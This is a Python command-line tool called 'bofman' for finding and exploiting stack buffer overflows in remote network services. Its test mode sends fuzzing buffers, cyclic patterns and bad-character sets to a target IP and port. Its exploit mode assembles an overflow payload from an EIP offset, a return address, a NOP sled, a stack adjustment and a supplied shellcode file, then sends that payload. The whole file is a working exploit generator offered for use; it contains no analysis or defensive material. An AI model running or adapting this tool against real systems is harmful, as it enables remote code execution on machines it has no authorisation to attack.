#!/usr/bin/python3

from data import *
import argparse
import sys
import socket
import os.path

_parser = argparse.ArgumentParser(prog='bofman',description='investigate and exploit buffer overflows')

#_parser.add_argument('--mode',action='store',choices=['test','exploit'],required=True,)

_subparsers = _parser.add_subparsers(help='sub command help',dest='cmdlet')

test_parser = _subparsers.add_parser('test',help='options for test')
test_parser.add_argument('ip',type=str,help='ip of remote target')
test_parser.add_argument('port',type=int,help='remote port')
test_parser.add_argument('--len',type=int,help='size of buffer to send',default=1024)
test_parser.add_argument('--buffer-type',type=str,choices=['a','pattern','confirm','badchars'],help='type of buffer to send',default='a')
test_parser.add_argument('--command',type=str,help='server command to prepend buffer with')
test_parser.add_argument('-b',type=str,help='badchars to exclude from buffer seperated by commas (in integer form)')
test_parser.add_argument('--post_command',type=str,help='server command to append buffer with (remember to escape backslashes)')

exploit_parser = _subparsers.add_parser('exploit',help='options for exploit')
exploit_parser.add_argument('ip',type=str,help='ip of remote target')
exploit_parser.add_argument('port',type=int,help='remote port')
exploit_parser.add_argument('--len',type=int,help='size of buffer to send',required=True)
exploit_parser.add_argument('--offsetEIP',type=int,help='how many bytes to write before EIP',required=True)
exploit_parser.add_argument('--eip',type=str,help='memory location to overwrite EIP',required=True)
exploit_parser.add_argument('--shellcode',type=str,help='path to shellcode in raw binary form',required=True)
exploit_parser.add_argument('--shellcodeOffset',type=int,help='offset to begin shellcode',required=True)
exploit_parser.add_argument('--sub_esp',type=int,help='integer value to (1-9) of how many kilobytes to subtract from ESP')
exploit_parser.add_argument('--nops',type=int,help='number of nops to place before shellcode')
exploit_parser.add_argument('--command',type=str,help='server command to prepend buffer with')
exploit_parser.add_argument('--post_command',type=str,help='server command to append buffer with (remember to escape backslashes)')


query_parser = _subparsers.add_parser('q',help='query for offsets')
query_parser.add_argument('query',type=str,help='find for offset for query string')

args = _parser.parse_args()

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)


if __name__ == '__main__':
	print(args)
	if(args.cmdlet=='test'):
		print('test')

		if(args.command != None):
			buffer = args.command.encode()
		else:
			buffer = b''

		if(args.buffer_type=='a'):
			buffer += b'A'*args.len


		elif(args.buffer_type=='pattern'):
			buffer+=pattern[0:args.len]

		elif(args.buffer_type=='badchars'):
			if(args.b == None):
				pass
			else:
				exclude_list = [int(x) for x in args.b.split(',')]
				for bc in exclude_list:
					if(bc>255 or bc <0):
						print('badchar values between 0-255 only! quitting...')
						sys.exit(1)
					badchars = badchars.replace(bytes([bc]),b'') #replace badchar from exclude_list with empty
			buffer += b'A'*(args.len - 4)+b'BBBB'+badchars+b'CCCC'

		elif(args.buffer_type=='confirm'):
			buffer+=b'A'*args.len+b'BBBB'+b'CCCC'



		if(args.post_command != None):
			args.post_command=args.post_command.replace('\\n','\n')
			args.post_command=args.post_command.replace('\\r','\r')
			buffer+=args.post_command.encode()

		print('prepared buffer is:{0}...{1}'.format(buffer[0:10],buffer[len(buffer)-10:-1]))
		try:
			sock.connect((args.ip,args.port))
			sock.send(buffer)
			sock.close()
			print('\n successfully sent buffer of length:{}'.format(len(buffer)))
		except ConnectionRefusedError:
			print('\nconnection refused, check IP and PORT')

	elif(args.cmdlet=='exploit'):
		print('exploit')

		stack_adjust = b'\x81\xec\x00'
		zeros = b'\x00\x00'

		nop = b'\x90'

		#check nops
		if(args.nops == None):
			nops=0
		else:
			nops=args.nops

		#repack eip
		eip = bytes.fromhex(args.eip)[::-1] #convert string representation of memory address to bytes and reverses for little endian

		#place server command
		if(args.command==None):
			buffer = b''
		else:
			buffer = args.command.encode()

		#check shellcode
		if(not os.path.isfile(args.shellcode)):
			print('shellcode file does not exist! quitting...')
			sys.exit(1)
		else:
			shellcode_file = open(args.shellcode,'rb')
			shellcode1 = shellcode_file.read()
			shellcode_file.close()


		if(args.sub_esp == None):
			shellcode = shellcode1
		else:
			if(args.sub_esp < 1 or args.sub_esp > 9):
				print('enter sub esp value between 1 and 9 (kB to subtract from stack pointer)')
				sys.exit(1)
			val = bytes.fromhex('{}'.format(args.sub_esp*10))
			stack_adjust += val + zeros
			_tmp = stack_adjust + shellcode1
			shellcode = _tmp


		if(args.offsetEIP + 4 == args.shellcodeOffset):
			buffer += b'A'*args.offsetEIP + eip + b'A'*(args.offsetEIP - args.shellcodeOffset + 4) + nop*nops + shellcode + b'A'*(args.len - args.offsetEIP - 4 - len(shellcode)-nops)
		elif(args.offsetEIP + 4 > args.shellcodeOffset):
			if(len(shellcode)+args.shellcodeOffset < args.offsetEIP):
				buffer += b'A'*(args.shellcodeOffset)+nop*nops+shellcode+b'A'*(args.offsetEIP - nops - args.shellcodeOffset - len(shellcode)) + eip + b'A'*(args.len - args.offsetEIP - 4)
			else:
				print('shellcode too big to fit before EIP! exiting...')
				sys.exit(1)
		else:
			print('it seems your offsets are off...try again or report a bug if you are sure...')
			sys.exit(1)

		if(args.post_command != None):
			args.post_command=args.post_command.replace('\\n','\n')
			args.post_command=args.post_command.replace('\\r','\r')
			buffer+=args.post_command.encode()

		print('prepared buffer is:{0}...{1}'.format(buffer[0:10],buffer[len(buffer)-10:-1]))

		try:
			sock.connect((args.ip,args.port))
			sock.send(buffer)
			sock.close()
			print('\n successfully sent buffer of length:{}'.format(len(buffer)))
		except ConnectionRefusedError:
			print('\nconnection refused, check IP and PORT')

	elif(args.cmdlet=='q'):
		print('query to be implemented')
